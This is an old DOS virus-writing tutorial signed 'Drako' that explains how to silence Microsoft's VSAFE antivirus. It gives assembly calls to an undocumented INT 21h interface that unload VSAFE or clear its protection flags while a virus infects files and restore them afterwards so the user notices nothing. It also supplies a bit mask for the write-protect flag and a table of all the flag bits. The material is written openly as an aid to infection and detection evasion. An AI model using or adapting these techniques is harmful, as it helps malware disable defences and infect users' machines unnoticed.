VSAFE, A joy :)
-----------------------------------------------------------------
Original Idea from Cyborg

   Ok, as you already know, VSAFE isn't the most secure program in
the world....  Until now, all thatwas needed was 3 lines of code
and that's it, no more problem.  To uninstall, all that had to be
done was type:

     MOV  AX, 0FA01h
     MOV  DX, 5945h
     INT  21h

   This was enough to get VSAFE out of memory.....  Still, there
was always the possibility that VSAFE could end up 'below' another
resident program, in which case VSAFE would display an ugly message

"VSAFE cannot be removed........... bla bla bla"

   Besides, if the user tried to get into VSAFE and found it gone,
he might begin to suspect something.

   To avoid this situation what we do is, instead of a brute force
removal, is to null the alarms while we infect and re-set them when
we are done infecting.  To do this, I analysed several of VSAFE's
sub-services and I discovered some very interesting things:

     MOV  AX, 0FA__h     ;__ is the corresponding subfunction
     MOV  DX, 5945h      ;as described below.
     INT  21h

Sub_functi¢n 00h
^^^^^^^^^^^^^^^^
     AL <== 00h     ;Check for residence (I suppose). If Vsafe is
               ;resident, BX returns 2F00h and if not, BX remains
               ;intact.
     If VSAFE is resident:   2F00h ==> BX
     If it isn't:               BX ==> BX

Sub_funci¢n 01h
^^^^^^^^^^^^^^^
     AL <== 01h     ;Uninstall VSAFE.  It's possible that VSAFE
                    ;could lock up and not be uninstalled

Sub_funci¢n 02h
^^^^^^^^^^^^^^^
     AL <== 02h     ;The saving grace...  When executed, I need
     BL <== Flags   ;I need to put in BL VSAFE's new flags...
     Flags ==> CL   ;Obviously I don't worry too much about which
                    ;flags I need to turn off
               ;so I turn them all off.  Once I call this function
               ;CL returns the previous attributes (just what I
               ;need to restore the flags...

   Well, this is as far I'm going today since I've achieved my
objective.  Some other time when I'm more up to it I'll figure the
rest of the functions.

Detail:
^^^^^^^
   There are times when the write protect flag can be aggravating.
For example:  The virus is executed on a 'normal' machine and
everything works fine.  But what happens if the machine has a write
cache?  VSAFE sets off the alarm since, at the moment the program
is written to disk, VSAFE has been reloaded as before.  To bypass
that, we could get rid of THAT flag with an AND, as shown below:

     and  bl, 11111011b  ;Where bit 2 is the write protect bit

   The rest of the flags are as follows:

   Bits  7 6 5 4 3 2 1 0
         . . . . . . . 1    Low level HD format
         . . . . . . 1 .    Resident
         . . . . . 1 . .    Write protect
         . . . . 1 . . .    Verify executable files
         . . . 1 . . . .    Boot sector virus
         . . 1 . . . . .    Protect HD boot sector
         . 1 . . . . . .    Protect FD boot sector
         1 . . . . . . .    Protect executable files

Enjoy !! Drako..



